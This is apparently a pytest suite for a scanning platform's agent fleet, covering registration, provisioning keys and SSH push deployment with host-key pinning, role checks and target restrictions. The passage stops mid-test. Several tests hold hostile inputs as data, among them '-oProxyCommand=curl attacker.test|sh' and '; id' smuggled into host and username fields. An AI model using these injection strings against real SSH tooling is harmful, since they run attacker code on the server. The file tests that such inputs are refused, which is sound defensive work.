"""Tests for Agent Fleet Monitoring, Health Metrics, Deployment, and Update Lifecycle."""

from __future__ import annotations

import base64
import time
from pathlib import Path

from api.services import agent_deployer
from tests.conftest import (
    approve_scan_scope,
    auth_headers,
    configured_client,
    make_settings,
    requires_postgres,
)

pytestmark = requires_postgres


# A fixed key blob, so the fingerprint a test asserts on is the fingerprint the
# production code computes rather than a second implementation of it.
HOST_KEY_BLOB = b"ssh-ed25519-test-host-key"
OTHER_KEY_BLOB = b"ssh-ed25519-some-other-host"
HOST_KEY = agent_deployer.HostKey(
    key_type="ssh-ed25519",
    public_key=base64.b64encode(HOST_KEY_BLOB).decode(),
    fingerprint=agent_deployer.fingerprint_of(HOST_KEY_BLOB),
)
OTHER_KEY = agent_deployer.HostKey(
    key_type="ssh-ed25519",
    public_key=base64.b64encode(OTHER_KEY_BLOB).decode(),
    fingerprint=agent_deployer.fingerprint_of(OTHER_KEY_BLOB),
)


def _stub_host_key(monkeypatch, key: agent_deployer.HostKey = HOST_KEY) -> None:
    """Answer the host key probe without a network, and without pinning."""
    monkeypatch.setattr(
        "api.services.agent_deployer.probe_host_key",
        lambda host, port, timeout=10: key,
    )


def _record_ssh(monkeypatch) -> list[dict]:
    """Capture every remote command instead of running it.

    Also collapses the post-install heartbeat wait, so the worker thread a test
    starts is finished before the test is — a daemon thread still sleeping
    against a truncated database is a flake, not a signal.
    """
    calls: list[dict] = []

    def fake_ssh_cmd(req, cmd, *, host_key, timeout=120, stdin_data=None):
        calls.append({"command": cmd, "stdin": stdin_data, "host_key": host_key})
        if "uname" in cmd:
            return 0, "Linux x86_64 0\n", ""
        return 0, "Agent installed successfully\n", ""

    monkeypatch.setattr("api.services.agent_deployer._execute_ssh_command", fake_ssh_cmd)
    monkeypatch.setattr("api.services.agent_deployer._VERIFY_ATTEMPTS", 1)
    monkeypatch.setattr("api.services.agent_deployer._VERIFY_INTERVAL_SECONDS", 0)
    return calls


def _wait_for_deploy(client, headers, deploy_id: str, timeout: float = 10.0) -> dict:
    """Wait until a deployment run reaches a terminal state.

    Lets a test that starts a real (SSH-stubbed) deployment finish it before
    asserting, instead of racing the worker thread — and leaves no thread still
    writing to a database the next test is about to truncate.
    """

    def finished():
        resp = client.get(f"/api/agent/deploy/{deploy_id}/status", headers=headers)
        assert resp.status_code == 200
        body = resp.json()
        return body if body["status"] in ("completed", "failed") else None

    return _wait_for(finished, timeout)


def _wait_for(predicate, timeout: float = 10.0):
    """Wait for the deployment worker thread to get somewhere.

    The push is answered before the install runs — that is the point of the
    route — so anything asserted about the remote command has to wait for it.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        result = predicate()
        if result:
            return result
        time.sleep(0.05)
    raise AssertionError("timed out waiting for the deployment worker")


def _deploy_payload(**overrides) -> dict:
    payload = {
        "host": "192.168.10.50",
        "port": 22,
        "username": "admin",
        "password": "secret-ssh-password",
        "tenant_id": "default",
        "agent_id": "agent-remote-50",
        "expected_host_key": HOST_KEY.fingerprint,
    }
    payload.update(overrides)
    return payload


def test_agent_telemetry_heartbeat_and_fleet_summary(tmp_path: Path, monkeypatch):
    settings = make_settings(tmp_path, agent_stale_seconds=10)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")

    # 1. Register two agents
    reg1 = client.post(
        "/api/agent/register",
        json={
            "agent_id": "agent-alpha",
            "hostname": "srv-scan-01",
            "version": "0.42.0",
            "labels": {"zone": "eu-west-1", "tier": "production"},
        },
        headers={"Authorization": f"Bearer {settings.agent_token}"},
    )
    assert reg1.status_code == 200
    assert reg1.json()["agent_id"] == "agent-alpha"

    reg2 = client.post(
        "/api/agent/register",
        json={
            "agent_id": "agent-beta",
            "hostname": "srv-scan-02",
            "version": "0.40.0",  # Outdated version
            "labels": {"zone": "us-east-1", "tier": "staging"},
        },
        headers={"Authorization": f"Bearer {settings.agent_token}"},
    )
    assert reg2.status_code == 200
    assert reg2.json()["is_outdated"] is True

    # 2. Send heartbeat with system metrics
    hb_resp = client.post(
        "/api/agent/heartbeat",
        json={
            "agent_id": "agent-alpha",
            "status": "busy",
            "current_job_id": "job-101",
            "detail": "Scanning 10.0.0.0/24",
            "metrics": {
                "cpu_percent": 34.5,
                "memory_used_mb": 512.0,
                "memory_total_mb": 4096.0,
                "disk_free_gb": 42.0,
                "uptime_seconds": 3600,
            },
            "capabilities": ["pulse", "nuclei", "nmap"],
        },
        headers={"Authorization": f"Bearer {settings.agent_token}"},
    )
    assert hb_resp.status_code == 200
    hb_data = hb_resp.json()
    assert hb_data["status"] == "busy"
    assert hb_data["metrics"]["cpu_percent"] == 34.5
    assert hb_data["metrics"]["uptime_seconds"] == 3600
    assert hb_data["capabilities"] == ["pulse", "nuclei", "nmap"]

    # 3. Fleet Summary API Check
    summary_resp = client.get("/api/agents/summary", headers=admin_hdrs)
    assert summary_resp.status_code == 200
    summary = summary_resp.json()
    assert summary["total_agents"] == 2
    assert summary["online_agents"] == 2
    assert summary["busy_agents"] == 1
    assert summary["outdated_agents"] == 1
    assert summary["latest_version"] == "0.42.0"

    # 4. Get Agent Detail API
    detail_resp = client.get("/api/agents/agent-alpha", headers=admin_hdrs)
    assert detail_resp.status_code == 200
    detail = detail_resp.json()
    assert detail["agent_id"] == "agent-alpha"
    assert detail["hostname"] == "srv-scan-01"
    assert detail["metrics"]["cpu_percent"] == 34.5
    assert detail["online"] is True
    assert detail["is_outdated"] is False

    # 5. Remote Upgrade Request Trigger
    upgrade_resp = client.post("/api/agents/agent-beta/upgrade", headers=admin_hdrs)
    assert upgrade_resp.status_code == 200
    assert upgrade_resp.json()["status"] == "upgrade_queued"

    # Check detail confirms upgrade_requested
    detail_beta = client.get("/api/agents/agent-beta", headers=admin_hdrs).json()
    assert detail_beta["upgrade_requested"] is True
    assert detail_beta["is_outdated"] is True

    # 6. Delete / Deregister Agent
    del_resp = client.delete("/api/agents/agent-beta", headers=admin_hdrs)
    assert del_resp.status_code == 200
    assert del_resp.json()["status"] == "deleted"

    # Confirm 404
    assert client.get("/api/agents/agent-beta", headers=admin_hdrs).status_code == 404


def test_agent_installer_and_deployment_snippets(tmp_path: Path, monkeypatch):
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")

    # 1. Download install.sh
    sh_resp = client.get("/api/agent/install.sh")
    assert sh_resp.status_code == 200
    assert "#!/usr/bin/env bash" in sh_resp.text
    assert "Shapoclyack Remote Agent Universal Installer" in sh_resp.text

    # 2. Get Deployment Snippets — read-only, so no key is minted
    snip_resp = client.get("/api/agent/deployment-command", headers=admin_hdrs)
    assert snip_resp.status_code == 200
    snips = snip_resp.json()
    assert snips["provisioning_key"] is None
    assert snips["key_minted"] is False
    assert "<PROVISIONING_KEY>" in snips["systemd_oneliner"]
    assert "curl -sSL" in snips["systemd_oneliner"]
    assert "docker run -d --name shapoclyack-agent" in snips["docker_run"]
    assert "apiVersion: apps/v1" in snips["kubernetes_yaml"]

    # 3. Minting is an explicit POST, and only then is a plaintext key returned
    mint_resp = client.post("/api/agent/deployment-command", json={}, headers=admin_hdrs)
    assert mint_resp.status_code == 201
    minted = mint_resp.json()
    key = minted["provisioning_key"]
    assert key.startswith("octo-pk-")
    assert minted["key_minted"] is True
    assert key in minted["systemd_oneliner"]
    assert key in minted["docker_run"]
    assert key in minted["docker_compose"]
    assert key in minted["kubernetes_yaml"]
    assert "<PROVISIONING_KEY>" not in minted["systemd_oneliner"]


def _key_count(client, admin_hdrs, tenant_id: str = "default") -> int:
    resp = client.get(f"/api/tenants/{tenant_id}/provisioning-keys", headers=admin_hdrs)
    assert resp.status_code == 200
    return len(resp.json())


def test_minting_a_deployment_key_takes_admin_and_reading_takes_operator(
    tmp_path: Path, monkeypatch
):
    """#231 — minting is the same credential as /tenants/{id}/provisioning-keys.

    Reading the snippets stays `operator`: it mints nothing and the key is a
    placeholder. Handing out a key that registers agents into the tenant is an
    `admin` act, matching the route that has always administered these keys,
    rather than the weakest route that happens to mint one.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    operator_hdrs = auth_headers(client, username="operator")
    viewer_hdrs = auth_headers(client, username="viewer")

    before = _key_count(client, admin_hdrs)

    # A viewer can neither read the snippets nor mint a key.
    assert client.get("/api/agent/deployment-command", headers=viewer_hdrs).status_code == 403
    assert (
        client.post(
            "/api/agent/deployment-command", json={}, headers=viewer_hdrs
        ).status_code
        == 403
    )

    # Repeated reads by an operator leave the key table untouched...
    for _ in range(3):
        resp = client.get("/api/agent/deployment-command", headers=operator_hdrs)
        assert resp.status_code == 200
        assert resp.json()["provisioning_key"] is None
    assert _key_count(client, admin_hdrs) == before

    # ...and an operator cannot mint one at all.
    assert (
        client.post(
            "/api/agent/deployment-command", json={}, headers=operator_hdrs
        ).status_code
        == 403
    )
    assert _key_count(client, admin_hdrs) == before

    # One admin POST mints exactly one key, carrying the requested label.
    mint = client.post(
        "/api/agent/deployment-command",
        json={"label": "k8s cluster east"},
        headers=admin_hdrs,
    )
    assert mint.status_code == 201
    assert mint.json()["provisioning_key"].startswith("octo-pk-")
    assert _key_count(client, admin_hdrs) == before + 1

    keys = client.get("/api/tenants/default/provisioning-keys", headers=admin_hdrs).json()
    assert any(k["label"] == "k8s cluster east" for k in keys)

    # An unlabelled mint falls back to the default label.
    assert (
        client.post(
            "/api/agent/deployment-command", json={}, headers=admin_hdrs
        ).status_code
        == 201
    )
    keys = client.get("/api/tenants/default/provisioning-keys", headers=admin_hdrs).json()
    assert any(k["label"] == "Web UI Deployment Key" for k in keys)
    assert _key_count(client, admin_hdrs) == before + 2


def test_minted_deployment_key_registers_an_agent(tmp_path: Path, monkeypatch):
    """The minted key is a real credential: it exchanges for an agent JWT."""
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")

    minted = client.post(
        "/api/agent/deployment-command", json={}, headers=admin_hdrs
    ).json()
    token_resp = client.post(
        "/api/auth/agent/token",
        json={"provisioning_key": minted["provisioning_key"]},
    )
    assert token_resp.status_code == 200


def test_snippets_use_the_configured_base_url_not_the_host_header(
    tmp_path: Path, monkeypatch
):
    """#233 — the install URL must not come from a header the caller writes.

    ``server_url`` is embedded in a command that runs as root on the target and
    is written into the agent's ``OCTO_API_URL``, so whoever chose it chose
    where the next agent fetches its installer from and reports to.
    """
    client = configured_client(
        tmp_path, monkeypatch, public_base_url="https://console.example.com"
    )
    admin_hdrs = auth_headers(client, username="admin")

    resp = client.get(
        "/api/agent/deployment-command",
        headers={**admin_hdrs, "Host": "attacker.example.net"},
    )

    assert resp.status_code == 200
    body = resp.json()
    assert body["server_url"] == "https://console.example.com"
    assert "attacker.example.net" not in body["systemd_oneliner"]
    assert "https://console.example.com/api/agent/install.sh" in body["systemd_oneliner"]
    assert "attacker.example.net" not in body["kubernetes_yaml"]


def test_remote_ssh_deployer_flow(tmp_path: Path, monkeypatch):
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)

    start_resp = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert start_resp.status_code == 200
    deploy_data = start_resp.json()
    deploy_id = deploy_data["deploy_id"]
    assert deploy_id.startswith("dep_")
    assert deploy_data["status"] in ("queued", "connecting", "installing")

    # Poll status
    status_resp = client.get(f"/api/agent/deploy/{deploy_id}/status", headers=admin_hdrs)
    assert status_resp.status_code == 200
    assert len(status_resp.json()["logs"]) >= 1
    assert _wait_for_deploy(client, admin_hdrs, deploy_id)["status"] == "completed"


def test_ssh_push_takes_admin(tmp_path: Path, monkeypatch):
    """#231 - the push mints a provisioning key *and* installs code as root."""
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    _stub_host_key(monkeypatch)
    calls = _record_ssh(monkeypatch)

    for username in ("viewer", "operator"):
        resp = client.post(
            "/api/agent/deploy/ssh",
            json=_deploy_payload(),
            headers=auth_headers(client, username=username),
        )
        assert resp.status_code == 403, username
    assert calls == []


def test_ssh_deployment_refuses_an_unpinned_host(tmp_path: Path, monkeypatch):
    """No verified fingerprint, no deployment (#232).

    The old deployer added whatever key answered and then sent the operator's
    SSH password and a freshly minted tenant provisioning key down that
    channel. Refusing has to happen before either exists, so this asserts that
    nothing was executed and no key was minted, not merely that the response
    was an error.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    calls = _record_ssh(monkeypatch)
    keys_before = _key_count(client, admin_hdrs)

    resp = client.post(
        "/api/agent/deploy/ssh",
        json=_deploy_payload(expected_host_key=None),
        headers=admin_hdrs,
    )

    assert resp.status_code == 409
    # The observed fingerprint is reported, so the operator can verify it on the
    # host and come back with it - that is the whole of the remediation.
    assert HOST_KEY.fingerprint in resp.json()["detail"]
    assert calls == []
    assert _key_count(client, admin_hdrs) == keys_before


def test_ssh_deployment_refuses_a_fingerprint_that_does_not_match(
    tmp_path: Path, monkeypatch
):
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    calls = _record_ssh(monkeypatch)

    resp = client.post(
        "/api/agent/deploy/ssh",
        json=_deploy_payload(expected_host_key=OTHER_KEY.fingerprint),
        headers=admin_hdrs,
    )

    assert resp.status_code == 409
    assert calls == []


def test_a_changed_host_key_is_refused_rather_than_re_pinned(
    tmp_path: Path, monkeypatch
):
    """The second deployment checks the pin, and a different key ends the run."""
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    calls = _record_ssh(monkeypatch)

    first = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert first.status_code == 200
    # Let the legitimate run finish, so every call it makes is already recorded
    # and the assertion below is about the refused run and nothing else.
    _wait_for_deploy(client, admin_hdrs, first.json()["deploy_id"])

    # The target now answers with a different key. Even naming that key as the
    # expected one must not overwrite the pin - a pinned host is not re-trusted
    # on the say-so of the same request that carries the credentials.
    _stub_host_key(monkeypatch, OTHER_KEY)
    second = client.post(
        "/api/agent/deploy/ssh",
        json=_deploy_payload(expected_host_key=OTHER_KEY.fingerprint),
        headers=admin_hdrs,
    )

    assert second.status_code == 409
    detail = second.json()["detail"]
    assert HOST_KEY.fingerprint in detail
    assert OTHER_KEY.fingerprint in detail
    # The refused run opened no connection. Asserted per key rather than as
    # "no calls at all", because the list also holds the first, legitimate run's
    # calls: a call carrying OTHER_KEY could only come from the run that was
    # supposed to be refused, since the worker is handed whatever key
    # resolve_host_key returned.
    assert [call for call in calls if call["host_key"] == OTHER_KEY] == []

    # And the pin is still the original one.
    probed = client.post(
        "/api/agent/deploy/ssh/host-key",
        json={"host": "192.168.10.50", "port": 22},
        headers=admin_hdrs,
    )
    assert probed.status_code == 200
    assert probed.json()["pinned"] is True
    assert probed.json()["fingerprint"] == HOST_KEY.fingerprint


def test_a_pinned_host_needs_no_fingerprint_on_the_next_run(
    tmp_path: Path, monkeypatch
):
    """Pinning is what makes the second deployment usable without a re-check."""
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)

    first = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert first.status_code == 200
    _wait_for_deploy(client, admin_hdrs, first.json()["deploy_id"])

    second = client.post(
        "/api/agent/deploy/ssh",
        json=_deploy_payload(expected_host_key=None),
        headers=admin_hdrs,
    )
    assert second.status_code == 200
    _wait_for_deploy(client, admin_hdrs, second.json()["deploy_id"])


def test_the_host_key_probe_sends_no_credentials_and_pins_nothing(
    tmp_path: Path, monkeypatch
):
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    calls = _record_ssh(monkeypatch)

    probed = client.post(
        "/api/agent/deploy/ssh/host-key",
        json={"host": "192.168.10.50", "port": 22},
        headers=admin_hdrs,
    )
    assert probed.status_code == 200
    body = probed.json()
    assert body["fingerprint"] == HOST_KEY.fingerprint
    assert body["key_type"] == "ssh-ed25519"
    # Not pinned: reading a key is not trusting it, and the deployment still
    # refuses until the operator names this fingerprint explicitly.
    assert body["pinned"] is False
    assert calls == []

    assert (
        client.post(
            "/api/agent/deploy/ssh",
            json=_deploy_payload(expected_host_key=None),
            headers=admin_hdrs,
        ).status_code
        == 409
    )


def test_the_provisioning_key_never_reaches_the_targets_argv(
    tmp_path: Path, monkeypatch
):
    """argv is world-readable on the target host (#232).

    The installer command line is the argv of a shell on the remote host, so a
    key placed there is readable by every local user for as long as the install
    runs. It travels on stdin instead.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    calls = _record_ssh(monkeypatch)

    started = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert started.status_code == 200
    _wait_for_deploy(client, admin_hdrs, started.json()["deploy_id"])

    install = _wait_for(
        lambda: next((call for call in calls if "install.sh" in call["command"]), None)
    )
    assert install["stdin"] is not None
    key = install["stdin"].strip()
    assert key.startswith("octo-pk-")
    assert key not in install["command"]
    assert "--key-stdin" in install["command"]
    assert "--key " not in install["command"]


def test_deployment_status_is_scoped_to_the_tenant(tmp_path: Path, monkeypatch):
    """#223 - the route resolved a tenant and then ignored it."""
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)

    assert (
        client.post(
            "/api/tenants",
            json={"name": "Other", "tenant_id": "ten_other"},
            headers=admin_hdrs,
        ).status_code
        == 201
    )

    deploy_id = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    ).json()["deploy_id"]
    _wait_for_deploy(client, admin_hdrs, deploy_id)

    assert (
        client.get(f"/api/agent/deploy/{deploy_id}/status", headers=admin_hdrs).status_code
        == 200
    )
    # Reading as another tenant is a 404, not a 403: whether that id exists
    # somewhere else is not the caller's business.
    other = client.get(
        f"/api/agent/deploy/{deploy_id}/status?tenant_id=ten_other",
        headers=admin_hdrs,
    )
    assert other.status_code == 404


def test_deployment_status_outlives_the_process_that_started_it(
    tmp_path: Path, monkeypatch
):
    """#223 - the journal was process-local, so a poll hit the wrong replica.

    A second app instance over the same database stands in for the second
    replica the prod overlay and api-pdb.yaml assume.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)

    deploy_id = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    ).json()["deploy_id"]
    _wait_for_deploy(client, admin_hdrs, deploy_id)

    from fastapi.testclient import TestClient

    from api.app import create_app

    second_replica = TestClient(create_app())
    resp = second_replica.get(
        f"/api/agent/deploy/{deploy_id}/status",
        headers=auth_headers(second_replica, username="admin"),
    )
    assert resp.status_code == 200
    assert resp.json()["deploy_id"] == deploy_id


def test_an_agent_in_another_tenant_reads_as_absent(tmp_path: Path, monkeypatch):
    """#223 - 403 on a foreign id and 404 on a missing one is an existence oracle.

    docs/api-and-rbac.md has promised 404 for both; this is the code catching up.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")

    assert (
        client.post(
            "/api/tenants",
            json={"name": "Other", "tenant_id": "ten_other"},
            headers=admin_hdrs,
        ).status_code
        == 201
    )
    client.post(
        "/api/agent/register",
        json={"agent_id": "agent-in-default", "hostname": "srv", "version": "0.42.0"},
        headers={"Authorization": f"Bearer {settings.agent_token}"},
    )

    for path, method in (
        ("/api/agents/agent-in-default?tenant_id=ten_other", client.get),
        ("/api/agents/agent-in-default?tenant_id=ten_other", client.delete),
        ("/api/agents/agent-in-default/upgrade?tenant_id=ten_other", client.post),
    ):
        resp = method(path, headers=admin_hdrs)
        assert resp.status_code == 404, path
        # Identical to the answer for an id that exists nowhere.
        missing = method(
            path.replace("agent-in-default", "agent-nowhere"), headers=admin_hdrs
        )
        assert missing.status_code == 404
        assert resp.json()["detail"] == missing.json()["detail"]


def test_upgrade_marker_survives_restart_and_clears_on_new_version(
    tmp_path: Path, monkeypatch
):
    """``upgrade_requested`` tracks the host, not the agent's uptime.

    Two failure modes, mirror images of each other: a plain restart used to wipe
    the marker (``register_agent`` rewrote ``detail`` without it), and nothing
    ever cleared it, so the UI's Upgrade control stayed disabled forever once an
    operator had used it. The reported version is the only evidence the host
    acted, so that — and only that — clears the marker.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    agent_hdrs = {"Authorization": f"Bearer {settings.agent_token}"}

    def register(version: str):
        return client.post(
            "/api/agent/register",
            json={
                "agent_id": "agent-marker",
                "hostname": "srv-marker",
                "version": version,
            },
            headers=agent_hdrs,
        )

    assert register("0.41.0").status_code == 200
    assert client.post("/api/agents/agent-marker/upgrade", headers=admin_hdrs).status_code == 200
    assert client.get("/api/agents/agent-marker", headers=admin_hdrs).json()["upgrade_requested"] is True

    # A heartbeat keeps the marker: the host has not been touched.
    hb = client.post(
        "/api/agent/heartbeat",
        json={
            "agent_id": "agent-marker",
            "status": "idle",
            "metrics": {"cpu_percent": 12.0},
        },
        headers=agent_hdrs,
    )
    assert hb.status_code == 200
    assert client.get("/api/agents/agent-marker", headers=admin_hdrs).json()["upgrade_requested"] is True

    # A restart re-registers with the same version — still not an upgrade, and
    # the telemetry the heartbeat reported is not discarded either.
    assert register("0.41.0").status_code == 200
    detail = client.get("/api/agents/agent-marker", headers=admin_hdrs).json()
    assert detail["upgrade_requested"] is True
    assert detail["metrics"]["cpu_percent"] == 12.0

    # A new reported version is the evidence, and clears it.
    assert register("0.42.0").status_code == 200
    detail = client.get("/api/agents/agent-marker", headers=admin_hdrs).json()
    assert detail["upgrade_requested"] is False
    assert detail["version"] == "0.42.0"


# --------------------------------------------------------------------------
# Where a deployment may point (#240)
# --------------------------------------------------------------------------


def _denials(client, headers) -> list[dict]:
    """The deployment targets this installation refused, newest first."""
    response = client.get(
        "/api/auth/events", headers=headers, params={"outcome": "denied", "limit": 50}
    )
    assert response.status_code == 200
    return [
        item for item in response.json()["items"] if item["reason"] == "deploy_target_denied"
    ]


def _trust_changes(client, headers) -> list[dict]:
    """Every pin this installation set or removed, newest first."""
    response = client.get(
        "/api/auth/events", headers=headers, params={"outcome": "trust_change", "limit": 50}
    )
    assert response.status_code == 200
    return response.json()["items"]


def test_the_probe_refuses_the_platforms_own_reflection_but_not_private_space(
    tmp_path: Path, monkeypatch
):
    """The deployer's policy is deliberately not the webhook policy (#240).

    An agent belongs inside an RFC1918 network, so refusing private space would
    refuse the product. What has no legitimate deployment behind it is the API
    pod's own loopback and the link-local range the cloud metadata service
    lives on — reaching those reports only on this platform itself.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)

    for host in ("127.0.0.1", "169.254.169.254", "0.0.0.0"):
        refused = client.post(
            "/api/agent/deploy/ssh/host-key",
            json={"host": host, "port": 22},
            headers=admin_hdrs,
        )
        assert refused.status_code == 403, host
        assert host in refused.json()["detail"]

    allowed = client.post(
        "/api/agent/deploy/ssh/host-key",
        json={"host": "192.168.10.50", "port": 22},
        headers=admin_hdrs,
    )
    assert allowed.status_code == 200
    assert allowed.json()["fingerprint"] == HOST_KEY.fingerprint

    # Every refusal is an access decision, so it lands in the same trail as the
    # rest of them rather than only in a log line.
    denied = _denials(client, admin_hdrs)
    assert len(denied) == 3
    assert {"127.0.0.1", "169.254.169.254", "0.0.0.0"} == {
        item["detail"].split("target=")[1].split(":")[0] for item in denied
    }


def test_a_destination_that_looks_like_an_ssh_option_never_reaches_argv(
    tmp_path: Path, monkeypatch
):
    """``ssh`` reads a leading ``-`` as an option, not as a host.

    ``-oProxyCommand=…`` is executed by ``/bin/sh`` in the API process, and it
    runs *before* the host key is compared — so the SSRF policy and the pin
    both sit behind it and neither one is reached. Refused at the schema, so
    the value never becomes an argument; the argv builders pass ``--`` as the
    second barrier, asserted below.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    calls = _record_ssh(monkeypatch)

    hostile = [
        {"host": "-oProxyCommand=curl attacker.test|sh"},
        {"username": "-oProxyCommand=curl attacker.test|sh"},
        {"host": "192.168.10.50; id"},
        {"host": "192.168.10.50 -oProxyCommand=sh"},
    ]
    for payload in hostile:
        refused = client.post(
            "/api/agent/deploy/ssh", json=_deploy_payload(**payload), headers=admin_hdrs
        )
        assert refused.status_code == 422, payload
        probe = client.post(
            "/api/agent/deploy/ssh/host-key",
            json={"host": payload.get("host", "192.168.10.50"), "port": 22},
            headers=admin_hdrs,
        )
        assert probe.status_code in (200, 422), payload
    assert calls == []


def test_the_ssh_argv_ends_option_parsing_before_the_destination(tmp_path: Path, monkeypatch):
    """The schema is the first barrier; this is the one that does not depend
    on the schema staying right."""
    recorded: dict = {}

    def fake_run(cmd, **kwargs):
        recorded["cmd"] = cmd
        raise AssertionError("the command must not run in a test")

    monkeypatch.setattr("api.services.agent_deployer.subprocess.run", fake_run)
    req = agent_deployer.AgentDeploySSHRequest(**_deploy_payload())
    try:
        agent_deployer._execute_openssh_command(
            req, "id -u", known_hosts=str(tmp_path / "known_hosts"), timeout=5, stdin_data=None
        )
    except AssertionError:
        pass
    cmd = recorded["cmd"]
    assert cmd[-3] == "--"
    assert cmd[-2] == f"{req.username}@{req.host}"


def test_a_port_outside_the_configured_ssh_list_is_refused(tmp_path: Path, monkeypatch):
    """Over an open port range the probe is a port scanner with a tidy format."""
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)

    refused = client.post(
        "/api/agent/deploy/ssh/host-key",
        json={"host": "192.168.10.50", "port": 5432},
        headers=admin_hdrs,
    )
    assert refused.status_code == 403
    assert "5432" in refused.json()["detail"]

    # The deployment itself is refused on the same grounds: the probe is not
    # the only way to open that connection.
    assert (
        client.post(
            "/api/agent/deploy/ssh",
            json=_deploy_payload(port=5432),
            headers=admin_hdrs,
        ).status_code
        == 403
    )

    # 2222 is on the default list, because that is where SSH goes when 22 is taken.
    assert (
        client.post(
            "/api/agent/deploy/ssh/host-key",
            json={"host": "192.168.10.50", "port": 2222},
            headers=admin_hdrs,
        ).status_code
        == 200
    )


def test_an_installation_may_reopen_the_full_port_range(tmp_path: Path, monkeypatch):
    """The restriction is a default, not a wall: a fleet on 2022 says so."""
    client = configured_client(tmp_path, monkeypatch, agent_deploy_ssh_ports="*")
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)

    assert (
        client.post(
            "/api/agent/deploy/ssh/host-key",
            json={"host": "192.168.10.50", "port": 5432},
            headers=admin_hdrs,
        ).status_code
        == 200
    )


def test_a_host_the_tenant_may_not_scan_is_not_a_deployment_target_either(
    tmp_path: Path, monkeypatch
):
    """A prohibition is a prohibition, whichever route reaches the address (#226).

    The approved scan scope is the only place this platform records "that host
    is not yours to touch". A deny entry that stops a scan but not an SSH
    connection opened by the same API would not be recording anything.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)
    approve_scan_scope(
        settings,
        entries=[
            {"effect": "allow", "kind": "cidr", "value": "0.0.0.0/0"},
            {"effect": "deny", "kind": "cidr", "value": "192.168.10.0/24"},
        ],
    )

    probed = client.post(
        "/api/agent/deploy/ssh/host-key",
        json={"host": "192.168.10.50", "port": 22},
        headers=admin_hdrs,
    )
    assert probed.status_code == 403
    assert "192.168.10.0/24" in probed.json()["detail"]

    deployed = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert deployed.status_code == 403
    assert len(_denials(client, admin_hdrs)) == 2

    # A host outside the denied range is unaffected.
    assert (
        client.post(
            "/api/agent/deploy/ssh/host-key",
            json={"host": "10.20.30.40", "port": 22},
            headers=admin_hdrs,
        ).status_code
        == 200
    )


def test_a_host_merely_outside_the_allowed_scope_still_deploys_by_default(
    tmp_path: Path, monkeypatch
):
    """Where an agent lives is not the same question as what it may scan.

    An agent on a management host that scans a customer range is the ordinary
    MSSP shape, so containment in the scan scope is an opt-in rather than the
    default — as the default it would refuse the normal deployment.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)
    approve_scan_scope(
        settings,
